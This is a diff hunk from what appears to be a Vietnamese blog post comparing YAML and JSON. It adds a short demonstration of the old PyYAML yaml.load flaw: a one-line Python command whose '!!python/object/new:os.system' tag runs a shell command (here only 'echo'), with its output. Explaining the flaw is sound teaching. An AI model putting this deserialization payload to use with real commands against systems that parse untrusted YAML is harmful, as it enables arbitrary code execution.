@@ -37,6 +37,14 @@ Function mặc định (và siêu phổ biến) để đọc file YAML: `yaml.lo
 
 Đến sau 2017, người dùng mới bắt đầu làm quen với function mới `yaml.safe_load`, an toàn hơn.
 
+Cài `pip install 'pyyaml<5.1'` để trải nghiệm CVE này:
+
+```py
+python3 -c 'import yaml; yaml.load("!!python/object/new:os.system [echo EXPLOIT!]")'                              [0]
+EXPLOIT!
+```
+
+Theo <https://github.com/yaml/pyyaml/wiki/PyYAML-yaml.load(input)-Deprecation>
 ## Phức tạp, nhiều phiên bản
 JSON có... 1 phiên bản duy nhất?!!
 
